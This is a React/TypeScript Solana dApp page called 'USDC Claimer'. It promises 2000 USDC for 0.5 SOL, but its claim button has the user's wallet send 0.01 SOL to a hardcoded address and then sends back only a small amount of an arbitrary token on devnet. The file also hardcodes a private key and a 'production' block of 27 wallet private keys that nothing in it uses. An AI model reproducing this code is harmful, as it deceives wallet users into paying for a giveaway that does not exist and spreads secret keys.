/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "57xFzaBZHau58RgSJHZxiTfxFRYGH6E9vvFe6AwDjRrQUpRvQr1fKDegVeGD7e8oJd8oTcEojXdkxZHu35eoDVXw"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3LxU3y12t6eEK3AZZDbDxGUPBjU7qoNF5qJoW8Me4DVzacKCyNv9mhtRk1d9XFZcfMJ98tuzAePvKFCtjSLBGEu8",
  "key1": "3HUy6YV9Syu9FwLVcoXWwv2anQpZhUN25QWdqrzbZ64YF9cM1DoDsjG5q4tvb5J4tnoLYNxozknFjXyeFvv58t4T",
  "key2": "4gxvT8a3NZf7qoto5CYUPF4BvDdh9a21BFg14pXd2TZZmgrSYduqY6s12guTLjz5DPTqjpo8z5YTXkx8og2j5AtG",
  "key3": "3dQ84J3HF918CNuCaVAPjWbzxa2uRjmriwiKkH76er3fHUxJMt52u6kd8ji7CNK8AEUkHHD3QRPHpenCLL4ASqko",
  "key4": "7GG4XJ3Z9kbx5pjNTDDF5PgyekLt3hEJyYFVB2mncUBwZGtsnmGD4UdEniHV9NW4YrGRN3m7oyHbEAsbMKzN4kh",
  "key5": "5YWKss89ajyT5GsFvazGv5Mob5rn8qd4m41vrrbA7gjSJkDCvQjua7jwCt7t1qaT8iNrwYWSpnanBwikAmtZbHwM",
  "key6": "5SPcSfd71HNWe2rJKSrA6xwDCDaCXEhxE12AXGMpQ8BbLCYUkzbKGpcJxfi37LArnncyGyAzPzmZDEY2Su1hnhPD",
  "key7": "5hLoM7eM7M1NfdU7pFMF2hygdJxDUCcyPkG3onttufpkcCvaT8P11NfhD9VHwruBYhKtoUMkZ2wCTY6a24kfyCBG",
  "key8": "5KdSRbXfdydqR5UNHuPs2vYm4JYRWRvWgeAtCmhXJ6sqVFK6c7wJ4P1agqkBjFeJZR1eqFZkXyH8fJ4f5fgVR24b",
  "key9": "5VuZ4C4dSxrKNuczDRHmKVAY5ibf8UqJVX4CC45dY2QimkS48mqsSQtzMwyLwSk39dekvWV8eCBP9zj3VZVtmWNp",
  "key10": "2YauS3iyBaT9WDDSiJj3VnRjJw2cTcFAwsL5Qhz9LmX5QgwU2VFe43G71zU3m4GxB9yUHZvpQFMsBQnT4kJ6ReKB",
  "key11": "57UtZHjozPA8RaoJsbQMWFrCphUYdHMsq8Q7er9CD5UWGqSoCuVpJHVxzerER2vb5Epu6f3CR3fBKs6BAdYdRURz",
  "key12": "6aZFFRvrvHUZNh9TCeAhiH7HvqkL1jXFXvaM8n4jTN57WjN5QrnaBHRHbeZtwBY19Epq4MWGWH6tegZ5HZSWgC6",
  "key13": "2Th9jMj566hziBknqb7ZZA4zC3dhRgJDZquikWesCtoq67bpaghJCwzDmaHT3dhdtFRKktitb7Y1Bc3y5YpDUVJC",
  "key14": "4p6XuduKjtTjmHuPWLB5ju5d3SBgNGfXrsznJLGeaGEj7cYg4jAYZTaSTigwq6ACcpBtG3F1Ez11cPZTZ91Uv5UV",
  "key15": "2pNcNP9QVpqCmS5twyt7365QgqagMemhATqym5sJo4ryxPFmnZ2xxoedszbSYijbRgfmARGTnQzVhQ6zmKHAP9g3",
  "key16": "3hgJwTCUWqPAPU9ujvFmgJ2bVaycxvLcK3NJqrkRZqrx2HBKECpffZVHvE776pPWpmfMVbe8q8WQf1c9Tu28paPi",
  "key17": "ydPXPHS4ui1TmX3MYja2JEVRhyy9CDpmzqwuK5QAxgtc5naWMxpPn9dNDcwXmk4NKbMnsnqMQULXeASZ9ZqpDpP",
  "key18": "ZFGhQYERRWmHft93E71LKtZhDG584rRfDfsx8PsnPaTRkTxeDp2oKiKqPb49QbYEDcDXSwYbUpd8wZzVvUvA82h",
  "key19": "5FP1ta1aKnqejNgtu8vLCbC4MsS5G551PrngJTKJBT7xDJmvYYWcnLE8XpdSqCsqxkq5KCswqgVochA4PhvPBCbm",
  "key20": "47ynhkPmgZg4GdJerueMm57rX7XmPtRa32TtmE85hGmRdPkgnJHDktdDS2c9uKNGT9S2ZzAay98YiZNv4o7wqaVj",
  "key21": "8JgiSwCvjoKBfMWStG8kx1HbuzwBE7B8YtVukUso2wfMo1N7c8bxtMAYxHNnePQt8UdyuM5VtB3YA83rCfQVm4o",
  "key22": "59ayBv5nYxjFxEB5LKuvRC4BFnsUVQ7moBkFTora3Ns6JXccEGhGrChZVxMthV6gNYhiAcDk1mDULLaYyGBAanGi",
  "key23": "4vihxnKr1B35wivrEAt5mQuGNZ68MWB1zXoUTonkMo1H9dXCfz5ecZoXCXRipVTr8dzVQGKKDbBvXMsnJGxp84YQ",
  "key24": "2Ua7jFnVgYsQYTfpXrb9KC569obFuKearfS2ZeMqs2hC3NrVjTCBazRTAmzzZ6NHbwTzAJbkee4n8WTQhzrN3vs6",
  "key25": "2oQvMmZZBcxqB6bpxywDskvqgC3Exz9dDsmtnrRh8Wpk2DPS8JDGVSqqtv1smudj47kA3XzCyqoFBU1bDVmpqp5Z",
  "key26": "4t1QGvsq7sGNNA1MUQpGu9fFb5ri1zYbwUUJRmPWJpJJvQ7aykU8U4BgnKJf54cVUrC6bciK2K1QgQZv6yNf9QKq"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
